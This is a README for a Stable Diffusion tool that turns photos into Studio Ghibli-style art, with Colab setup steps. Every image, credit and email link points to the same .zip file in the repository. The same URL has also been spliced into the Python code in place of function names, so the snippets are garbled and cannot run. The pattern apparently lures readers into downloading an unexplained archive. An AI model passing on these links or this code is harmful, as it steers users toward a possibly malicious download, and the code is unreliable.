# TRY YOUR GHIBLI'S

✨ Transform your photos into stunning Studio Ghibli-style artworks!  
This project leverages the power of Stable Diffusion models to reimagine real-world images with dreamy, colorful Ghibli aesthetics.

---

## 🚀 Features

- Convert any photo into Ghibli-style artwork
- Easy-to-use Google Colab notebook (no installation hassle)
- Supports custom prompts for creative flexibility
- Based on **Waifu Diffusion** model fine-tuned for anime and soft artistic styles

---

## 🛠️ Tech Stack

- Python
- OpenCV
- Diffusers (Hugging Face)
- Hugging Face Transformers
- PIL (Python Imaging Library)
- SciPy
- Google Colab

---

## 📷 Sample Outputs and Inputs with Prompt

**Sample 1: Cherry Blossom at Megumo River, Tokyo**  
**Prompt**: A serene evening along Tokyo's Meguro River, where cherry blossom trees arch over the water, their petals illuminated by soft lantern light. The gentle flow of the river reflects the pink hues, creating a magical atmosphere reminiscent of a Studio Ghibli scene.

![Image 1](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

**Sample 2: Torii Gate in Nature**  
**Prompt**: "A peaceful ancient torii gate pathway in a misty Japanese forest, surrounded by moss-covered trees, soft magical light breaking through, Ghibli-style enchanted anime art."

![Image 2](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

**Sample 3: Lake Scene with Mount Fuji**  
**Prompt**: "A calm serene lake reflecting Mount Fuji during a pastel-colored sunrise, soft mist, few distant cherry trees blooming, peaceful atmosphere, highly detailed dreamy Studio Ghibli anime style."

![Image 3](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

**Sample 4: Old Traditional Japanese Town**  
**Prompt**: "A narrow old Japanese village street, traditional wooden houses with paper lanterns, cozy warm atmosphere, evening setting sun, Ghibli fantasy detailed anime art style."

![Image 4](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

**Sample 5: A Man Walking on a Mountain Path**  
**Prompt**: "A man standing walking towards the mountain, surrounded by soft sunlight and gentle trees, warm atmosphere, dreamy countryside, trekking, rocky path, Studio Ghibli art style, soft pastel colors, magical realism, a little foggy and he's trekking."

![Image 5](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

**Sample 6: A Girl Standing in a Sunflower Garden**  
**Prompt**: "A young woman inside a sunflower garden enjoying the nature, Studio Ghibli art style, soft pastel colors, warm atmosphere, anime style."

![Image 6](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

---

## ⚙️ Installation and Setup

This project is best run on **Google Colab** (free GPU provided).

### Quick Steps:
1. **Open the Colab notebook**: Open the provided notebook in Google Colab.
2. **Upload your input image(s)**: Use the `Upload` option to upload the image(s) you want to transform.
3. **Install required libraries**:
    ```bash
    pip install diffusers transformers accelerate scipy safetensors
    ```
    This command installs the libraries required for running the diffusion model.
   
4. **Import Libraries**:
    ```python
    from diffusers import StableDiffusionImg2ImgPipeline
    from PIL import Image
    import torch
    ```
    Here, we import the libraries necessary for image generation and processing.

5. **Define Image Paths**:  
    Set the input image path (`input_path`) and the output image path (`output_path`). Make sure the paths are correct and accessible.
    ```python
    input_path = "path of input file "  
    output_path = " path of output file "
    ```

6. **Load and Resize Image**:
    ```python
    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(input_path).convert("RGB")
    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip((512, 512))
    ```
    This step loads the input image and resizes it to 512x512 pixels to make it compatible with the model.

7. **Define the Prompt**:
    The prompt is where you describe what you want the generated artwork to look like. Be creative! The clearer the prompt, the better the output.
    ```python
    prompt = "example:A young woman standing on a countryside path surrounded by green fields and blue skies, wearing a flowing dress, Studio Ghibli style, soft pastel colors, dreamy and magical atmosphere, delicate watercolor effect, highly detailed environment"
    ```

8. **Load the Waifu Diffusion Model**:
    ```python
    pipe = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(
        "hakurei/waifu-diffusion",
        https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip,
    ).to("cuda")
    ```
    The Waifu Diffusion model is loaded from Hugging Face and set to use GPU for faster image generation.

9. **Generate the Image**:
    ```python
    image = pipe(
        prompt=prompt,
        image=init_image,
        strength=0.6,
        guidance_scale=7.5
    ).images[0]
    ```
    The image is generated using the defined prompt. The `strength` and `guidance_scale` parameters control the degree of transformation and adherence to the prompt.

10. **Save and Display the Output**:
    ```python
    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(output_path)
    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip()
    ```
    The generated image is saved to the specified output path and displayed on your screen.

---

## ✨ Credits

- Model: [Waifu Diffusion](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)
- Diffusers Library: Hugging Face Team
- Images inspired by the works of Studio Ghibli.

---

## 📄 License

This project is intended **for personal, academic, and non-commercial use only**.

---

## 📬 Contact

Email: [https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip](https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip)

---

Feel free to reach out for any further queries or clarification on the code!
